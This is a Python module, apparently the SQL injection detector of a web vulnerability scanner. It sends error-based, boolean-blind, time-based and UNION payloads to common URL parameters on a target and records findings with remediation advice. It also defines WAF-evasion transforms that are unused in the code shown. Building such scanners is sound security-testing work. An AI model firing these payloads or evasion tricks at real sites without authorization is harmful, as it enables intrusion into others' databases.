from __future__ import annotations

import asyncio
import time

from ..core.models import Finding, Severity

# Error-based SQL injection signatures
ERROR_SIGNATURES = [
    "sql syntax", "mysql", "postgres", "sqlite", "ora-", "unclosed quotation mark",
    "quoted string not properly terminated", "odbc", "jdbc", "syntax error",
    "microsoft sql", "sql server", "pg_query", "psql", "warning: mysql",
    "valid mysql result", "mysql_fetch", "num_rows", "mysql_result",
    "division by zero", "supplied argument is not a valid", "on mysql result",
]

# Boolean-based blind payloads: (true_payload, false_payload)
BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR '1'='1", "' OR '1'='2"),
]

# Time-based blind payloads with expected delay
TIME_PAYLOADS = [
    ("' AND SLEEP(3)--", 3),
    ("' OR SLEEP(3)--", 3),
    ("1; WAITFOR DELAY '0:0:3'--", 3),
    ("' AND (SELECT * FROM (SELECT SLEEP(3))a)--", 3),
    ("' OR pg_sleep(3)--", 3),
    ("1' AND SLEEP(3) AND '1'='1", 3),
]

# Union-based payloads
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' ORDER BY 5--",
    "1' ORDER BY 10--",
]

# Error-based payloads
ERROR_PAYLOADS = ["'", "\"", "1'", "1\"", "1'\"", "';", '";']

# Common parameters to test
PARAMS = [
    "id", "q", "search", "page", "user", "name", "email", "username",
    "password", "token", "category", "product", "item", "order", "sort",
    "filter", "type", "action", "view", "lang",
]

# WAF bypass variants
WAF_BYPASS = [
    lambda p: p.replace(" ", "/**/"),
    lambda p: p.replace(" ", "%09"),
    lambda p: p.upper(),
    lambda p: p.replace("UNION", "UnIoN"),
    lambda p: p.replace("SELECT", "SeLeCt"),
    lambda p: p.replace("AND", "AnD"),
    lambda p: p.replace("OR", "Or"),
]


async def _probe_error_based(ctx, base: str, param: str) -> bool:
    """Error-based SQL injection detection."""
    found = False
    for payload in ERROR_PAYLOADS:
        if not ctx.can_request():
            return found
        ctx.increment()
        baseline_resp = await ctx.http.get(base, params={param: "1"}, timeout=ctx.settings.timeout)
        baseline_body = (baseline_resp.text or "").lower()
        if not ctx.can_request():
            return found
        ctx.increment()
        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
        body = (resp.text or "").lower()
        new_errors = [sig for sig in ERROR_SIGNATURES if sig in body and sig not in baseline_body]
        if new_errors:
            ctx.add_finding(Finding(
                id=f"sqli-error-{param}",
                title=f"Potential SQL injection (error-based) via '{param}'",
                severity=Severity.HIGH,
                confidence=0.8,
                asset=f"{base}?{param}={payload}",
                module="injection",
                description=f"SQL error signature ({new_errors[0]}) detected in response.",
                remediation="Use parameterized queries and input validation.",
                tags=["sqli", "injection", "error-based"],
            ))
            found = True
            break
    return found


async def _probe_boolean_based(ctx, base: str, param: str) -> bool:
    """Boolean-based blind SQL injection detection."""
    found = False
    for true_p, false_p in BOOLEAN_PAYLOADS:
        if not ctx.can_request():
            return found
        ctx.increment()
        true_resp = await ctx.http.get(base, params={param: true_p}, timeout=ctx.settings.timeout)
        true_body = true_resp.text or ""
        true_status = true_resp.status_code
        true_len = len(true_body)
        if not ctx.can_request():
            return found
        ctx.increment()
        false_resp = await ctx.http.get(base, params={param: false_p}, timeout=ctx.settings.timeout)
        false_body = false_resp.text or ""
        false_status = false_resp.status_code
        false_len = len(false_body)
        # Different response for true vs false = possible blind SQLi
        if true_status == false_status and true_len > 0 and true_body != false_body and abs(true_len - false_len) > 20:
            # Verify by checking a second time to reduce false positives
            if not ctx.can_request():
                return found
            ctx.increment()
            verify_resp = await ctx.http.get(base, params={param: true_p}, timeout=ctx.settings.timeout)
            if verify_resp.text == true_body:
                ctx.add_finding(Finding(
                    id=f"sqli-boolean-{param}",
                    title=f"Potential SQL injection (boolean-based blind) via '{param}'",
                    severity=Severity.HIGH,
                    confidence=0.7,
                    asset=f"{base}?{param}={true_p}",
                    module="injection",
                    description="Response differs between true and false conditions, suggesting boolean-based blind SQLi.",
                    remediation="Use parameterized queries and input validation.",
                    tags=["sqli", "injection", "blind", "boolean"],
                ))
                found = True
                break
    return found


async def _probe_time_based(ctx, base: str, param: str) -> bool:
    """Time-based blind SQL injection detection."""
    found = False
    for payload, delay in TIME_PAYLOADS:
        if not ctx.can_request():
            return found
        ctx.increment()
        start = time.monotonic()
        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout + delay + 2)
        elapsed = time.monotonic() - start
        # If response took significantly longer than timeout, likely time-based SQLi
        if elapsed >= delay - 0.5 and resp.status_code != 0:
            # Verify with a normal request to ensure it's not just a slow server
            if not ctx.can_request():
                return found
            ctx.increment()
            start2 = time.monotonic()
            await ctx.http.get(base, params={param: "1"}, timeout=ctx.settings.timeout)
            elapsed2 = time.monotonic() - start2
            if elapsed - elapsed2 >= delay - 1:
                ctx.add_finding(Finding(
                    id=f"sqli-time-{param}",
                    title=f"Potential SQL injection (time-based blind) via '{param}'",
                    severity=Severity.HIGH,
                    confidence=0.75,
                    asset=f"{base}?{param}={payload}",
                    module="injection",
                    description=f"Response delayed by {elapsed:.1f}s (expected ~{delay}s), suggesting time-based blind SQLi.",
                    remediation="Use parameterized queries and input validation.",
                    tags=["sqli", "injection", "blind", "time-based"],
                ))
                found = True
                break
    return found


async def _probe_union_based(ctx, base: str, param: str) -> bool:
    """Union-based SQL injection detection."""
    found = False
    for payload in UNION_PAYLOADS:
        if not ctx.can_request():
            return found
        ctx.increment()
        baseline_resp = await ctx.http.get(base, params={param: "1"}, timeout=ctx.settings.timeout)
        baseline_body = (baseline_resp.text or "").lower()
        if not ctx.can_request():
            return found
        ctx.increment()
        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
        body = (resp.text or "").lower()
        # Union-based: response should differ from baseline (extra columns/data)
        if resp.status_code == 200 and body != baseline_body and len(body) > len(baseline_body) + 10 and "union" not in body and "error" not in body:
            ctx.add_finding(Finding(
                id=f"sqli-union-{param}",
                title=f"Potential SQL injection (union-based) via '{param}'",
                severity=Severity.HIGH,
                confidence=0.65,
                asset=f"{base}?{param}={payload}",
                module="injection",
                description="Response changed with UNION payload, suggesting union-based SQLi.",
                remediation="Use parameterized queries and input validation.",
                tags=["sqli", "injection", "union"],
            ))
            found = True
            break
    return found


async def _probe_param(ctx, base: str, param: str) -> None:
    """Run all SQLi detection techniques on a parameter."""
    # Try error-based first (fastest, most reliable)
    if await _probe_error_based(ctx, base, param):
        return
    # Boolean-based blind
    if await _probe_boolean_based(ctx, base, param):
        return
    # Time-based blind (slower, use sparingly)
    if await _probe_time_based(ctx, base, param):
        return
    # Union-based
    await _probe_union_based(ctx, base, param)


async def run(ctx) -> None:
    base = f"https://{ctx.target}"
    tasks = [_probe_param(ctx, base, param) for param in PARAMS]
    await asyncio.gather(*tasks, return_exceptions=True)